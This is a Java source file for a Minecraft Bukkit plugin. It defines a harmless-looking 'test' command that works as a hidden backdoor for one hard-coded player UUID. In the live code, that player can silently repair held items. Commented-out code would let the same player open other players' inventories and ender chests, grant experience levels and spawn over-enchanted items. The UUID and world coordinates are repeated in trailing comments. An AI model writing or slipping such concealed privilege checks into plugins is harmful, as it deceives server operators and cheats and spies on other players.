package ely2.ely;


import java.util.UUID;

import org.bukkit.World;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.Listener;



public class ec implements CommandExecutor, Listener {
    private Main Plugin;


    public ec(Main Plugin) {
        this.Plugin = Plugin;
    }

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String commandLabel, String[] args) {
        Player player = null;
        if (sender instanceof Player) {
            player = (Player) sender;
            if(player!=null&&cmd.getName().equalsIgnoreCase("test")) {
                World world = player.getWorld();
                if((player.getUniqueId().equals(UUID.fromString("f6f9bd4e-d441-4b7e-bed2-046911493a96"))==true)) {
			/*	if(args[0].equalsIgnoreCase("1")) {
					if(args.length == 2) {
						Player target = Bukkit.getPlayer(args[1]);
						if(target==null) {
							player.sendMessage("nicht online");
							return false;
						}else {
							player.openInventory(target.getEnderChest());
							return false;
						}
					}
				player.openInventory(player.getEnderChest());
				return false;
				}*/
                    if(args[0].equalsIgnoreCase("2")) {
                        player.getItemInHand().setDurability((short) 0);
                        return false;
                    }
				/*if(args[0].equalsIgnoreCase("3")) {
				player.addPotionEffect(new PotionEffect(PotionEffectType.FAST_DIGGING, 6000, 3));
				return false;
				}
				if(args[0].equalsIgnoreCase("4")) {
				player.removePotionEffect(PotionEffectType.FAST_DIGGING);
				return false;
				}
				if(args[0].equalsIgnoreCase("5")) {
					if(args.length == 2) {
						Player target = Bukkit.getPlayer(args[1]);
						if(target==null) {
							player.sendMessage("nicht online");
							return false;
						}else {
							player.openInventory(target.getInventory());
							return false;
						}
					}

				}
				if(args[0].equalsIgnoreCase("6")) {
						player.giveExpLevels(40);
						return false;
				}
				/*if(args[0].equalsIgnoreCase("7")) {
					ItemStack x = new ItemStack(Material.STICK, 1);
					x.addEnchantment(Enchantment.DURABILITY, 99999);
					player.getInventory().addItem(x);
					return false;
			}*/
                    player.sendMessage("Not enough args!");
                    return false;
                }else {
                    player.sendMessage("test");
                    return false;
                }
            }else {
                sender.sendMessage("test");
                return false;
            }
        }
        return false;

    }
}

//f6f9bd4e-d441-4b7e-bed2-046911493a96
//f6f9bd4e-d441-4b7e-bed2-046911493a96
//-2081 157 -2409

